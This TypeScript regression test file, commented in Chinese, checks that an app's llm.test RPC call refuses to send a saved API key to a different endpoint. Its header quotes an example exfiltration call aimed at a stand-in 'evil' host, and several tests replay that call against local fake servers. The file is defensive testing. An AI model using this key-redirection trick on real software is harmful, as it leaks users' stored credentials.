/** llm.test 不许把已保存的密钥送到别处(安全审计 #3,2026-09-27)。
 *
 * 以前 llm.test 的覆盖项"只要是 LLMConfig 上有的键就盖":base_url、keychain_service、keychain_account 都能从界面临时改,
 * 不带 api_key 时引擎就去凭证库取那把已保存的 key——于是一个被注入的渲染层只要一句
 * `llmTest({ base_url: "https://evil/v1", keychain_account: "anthropic" })`,引擎就会把 Anthropic 的 key
 * 当 Bearer 发给 evil(渲染层自己的 CSP 是 connect-src 'none',出网是引擎替它出的)。
 *
 * 现在的口径:
 *  · 覆盖项和 llm.patch 同一张白名单;keychain_* 永远不许从这里指定(原话拒);
 *  · 供应商或 Base URL 和已保存的不一样时,这一次调用里必须自己带 api_key——已保存的 key 只发往保存时的那个端点。
 *
 * 全部离线:两个"端点"都是 127.0.0.1 上的假服务;凭证库整个换成假的(vi.mock),不读也不写系统凭证库。
 */
import * as fs from "node:fs";
import * as http from "node:http";
import * as os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

// 凭证库换成假的:取到的"已保存 key"带着 service / account,发到哪儿一眼看得出是哪一把
const keychain = vi.hoisted(() => ({
  getSecret: vi.fn((service: string, account: string): string | null => `sk-stored-${service}-${account}`),
}));
vi.mock("../src/keychain.js", async (importOriginal) => {
  const real = await importOriginal<typeof import("../src/keychain.js")>();
  return { ...real, getSecret: keychain.getSecret, hasSecret: () => true, setSecret: () => undefined };
});

import { RpcServer } from "../src/rpc.js";

const HERE = path.dirname(fileURLToPath(import.meta.url));
type Rec = Record<string, any>;

interface FakeEndpoint { url: string; seen: Array<[string, string]>; close: () => Promise<void> }

const servers: RpcServer[] = [];
const dirs: string[] = [];
const endpoints: FakeEndpoint[] = [];

/** 127.0.0.1 上的 OpenAI 兼容 chat/completions;记下每一次请求的路径与 Authorization。 */
async function fakeEndpoint(): Promise<FakeEndpoint> {
  const seen: Array<[string, string]> = [];
  const server = http.createServer((req, res) => {
    req.on("data", () => undefined);
    req.on("end", () => {
      seen.push([req.url ?? "", String(req.headers["authorization"] ?? "")]);
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({
        model: "deepseek-chat", choices: [{ message: { content: '{"ok": true}' }, finish_reason: "stop" }],
        usage: { prompt_tokens: 1, completion_tokens: 1 },
      }));
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = (server.address() as { port: number }).port;
  const ep: FakeEndpoint = {
    url: `http://127.0.0.1:${port}/v1`, seen,
    close: () => new Promise<void>((resolve) => server.close(() => resolve())),
  };
  endpoints.push(ep);
  return ep;
}

/** 起一个引擎;llm 段按给的来(其余沿用黄金基线的配置)。 */
function makeServer(llm: Rec): (method: string, params?: Rec) => Promise<Rec> {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "dafri-llmtest-exfil-"));
  dirs.push(dir);
  const base = JSON.parse(fs.readFileSync(path.join(HERE, "..", "baseline", "rpc", "base_config.json"), "utf-8"));
  const settingsPath = path.join(dir, "settings.json");
  fs.writeFileSync(settingsPath, JSON.stringify({ ...base, llm, storage: { db_path: path.join(dir, "t.db") } }));
  const s = new RpcServer(settingsPath, () => undefined);
  servers.push(s);
  return async (method, params = {}) => s.handle(JSON.parse(JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })));
}

/** 界面(LlmPanel.tsx 的 collect())给 OpenAI 兼容端点拼的载荷。 */
const uiOpenAi = (url: string): Rec => ({
  provider: "openai_compatible", model: "deepseek-chat", max_tokens: 4096, timeout_s: 10, base_url: url, temperature: null,
});

beforeEach(() => {
  keychain.getSecret.mockClear();
});

afterEach(async () => {
  for (const ep of endpoints.splice(0)) await ep.close();
  for (const s of servers.splice(0)) {
    s.anomaly.stop();
    s.engineBuilt?.stopTrackerLoop();
  }
  for (const d of dirs.splice(0)) {
    try {
      fs.rmSync(d, { recursive: true, force: true });
    } catch {
      /* Windows 上 sqlite 句柄可能还占着 */
    }
  }
});

describe("llm.test:审计里的外泄路径,现在一律当场拒", () => {
  it("已存的是 OpenAI 兼容端点:改 base_url + 指定 keychain_account=anthropic、不带 key → 拒,evil 一个请求都没收到", async () => {
    const saved = await fakeEndpoint();
    const evil = await fakeEndpoint();
    const call = makeServer(uiOpenAi(saved.url));
    const out = await call("llm.test", { llm: { base_url: evil.url, keychain_account: "anthropic" } });
    expect(out["result"]).toBeUndefined();
    expect(out["error"]).toEqual({
      code: -32602,
      message: "不允许修改的字段:keychain_account(测试用哪把 Key 只跟着供应商走,不能另指凭证条目)",
    });
    expect(evil.seen).toHaveLength(0);
    expect(saved.seen).toHaveLength(0);
    expect(keychain.getSecret).not.toHaveBeenCalled();
  });

  it("keychain_service 也不许指定(否则能把凭证库里别的条目当 key 发出去)", async () => {
    const saved = await fakeEndpoint();
    const call = makeServer(uiOpenAi(saved.url));
    const out = await call("llm.test", { llm: { keychain_service: "github.com", keychain_account: "me" } });
    expect(out["error"]).toEqual({
      code: -32602,
      message: "不允许修改的字段:keychain_account、keychain_service(测试用哪把 Key 只跟着供应商走,不能另指凭证条目)",
    });
    expect(saved.seen).toHaveLength(0);
    expect(keychain.getSecret).not.toHaveBeenCalled();
  });

  it("只改 base_url、不带 key → 拒:已保存的 key 不发往新地址", async () => {
    const saved = await fakeEndpoint();
    const evil = await fakeEndpoint();
    const call = makeServer(uiOpenAi(saved.url));
    const out = await call("llm.test", { llm: { ...uiOpenAi(evil.url) } });
    expect(out["result"]).toBeUndefined();
    expect(out["error"]["code"]).toBe(-32602);
    expect(out["error"]["message"]).toBe(
      "换了供应商或 Base URL 来测试时,要在这次测试里填上 API Key:已保存的 Key 只会发往保存时的那个端点,不会发往新地址。",
    );
    expect(evil.seen).toHaveLength(0);
    expect(keychain.getSecret).not.toHaveBeenCalled();
  });

  it("已存的是 Anthropic:切到 OpenAI 兼容端点、不带 key → 同样拒(不去凭证库取另一家的 key 发出去)", async () => {
    const evil = await fakeEndpoint();
    const call = makeServer({ provider: "anthropic", model: "claude-opus-5", effort: "high", temperature: null });
    const out = await call("llm.test", { llm: uiOpenAi(evil.url) });
    expect(out["error"]["code"]).toBe(-32602);
    expect(out["error"]["message"]).toContain("要在这次测试里填上 API Key");
    expect(evil.seen).toHaveLength(0);
    expect(keychain.getSecret).not.toHaveBeenCalled();
  });

  it("api_key 给空串等于没给:照样拒", async () => {
    const saved = await fakeEndpoint();
    const evil = await fakeEndpoint();
    const call = makeServer(uiOpenAi(saved.url));
    const out = await call("llm.test", { llm: { base_url: evil.url }, api_key: "" });
    expect(out["error"]["code"]).toBe(-32602);
    expect(evil.seen).toHaveLength(0);
  });
});

describe("llm.test:正常的两条路照旧能走", () => {
  it("测已保存的配置(界面原样载荷、不带 key):用凭证库里那把,发往已保存的端点", async () => {
    const saved = await fakeEndpoint();
    const call = makeServer(uiOpenAi(saved.url));
    const out = await call("llm.test", { llm: uiOpenAi(saved.url) });
    expect(out["error"]).toBeUndefined();
    expect(out["result"]).toMatchObject({ ok: true, provider: "openai_compatible", model: "deepseek-chat" });
    expect(saved.seen).toHaveLength(1);
    expect(saved.seen[0]).toEqual(["/v1/chat/completions", "Bearer sk-stored-dafri-llm-api-key-openai_compatible"]);
    expect(keychain.getSecret).toHaveBeenCalledWith("dafri-llm-api-key", "openai_compatible");
  });

  it("测已保存的配置:末尾多一个 / 不算换了端点;只改模型 / 超时也不算", async () => {
    const saved = await fakeEndpoint();
    const call = makeServer(uiOpenAi(saved.url));
    const out = await call("llm.test", { llm: { ...uiOpenAi(`${saved.url}/`), model: "deepseek-reasoner", timeout_s: 20 } });
    expect(out["error"]).toBeUndefined();
    expect(out["result"]).toMatchObject({ ok: true, provider: "openai_compatible" });
    expect(saved.seen[0]![1]).toBe("Bearer sk-stored-dafri-llm-api-key-openai_compatible");
  });

  it("测一套新配置 + 这次现填的 key:用的就是现填的这把,凭证库碰都不碰", async () => {
    const fresh = await fakeEndpoint();
    const call = makeServer({ provider: "anthropic", model: "claude-opus-5", effort: "high", temperature: null });
    const out = await call("llm.test", { llm: uiOpenAi(fresh.url), api_key: "sk-typed-just-now" });
    expect(out["error"]).toBeUndefined();
    expect(out["result"]).toMatchObject({ ok: true, provider: "openai_compatible" });
    expect(fresh.seen).toHaveLength(1);
    expect(fresh.seen[0]![1]).toBe("Bearer sk-typed-just-now");
    expect(keychain.getSecret).not.toHaveBeenCalled();
  });

  it("同一家换个 Base URL + 现填的 key:照样放行", async () => {
    const saved = await fakeEndpoint();
    const moved = await fakeEndpoint();
    const call = makeServer(uiOpenAi(saved.url));
    const out = await call("llm.test", { llm: uiOpenAi(moved.url), api_key: "sk-typed" });
    expect(out["result"]).toMatchObject({ ok: true });
    expect(moved.seen[0]![1]).toBe("Bearer sk-typed");
    expect(saved.seen).toHaveLength(0);
    expect(keychain.getSecret).not.toHaveBeenCalled();
  });
});
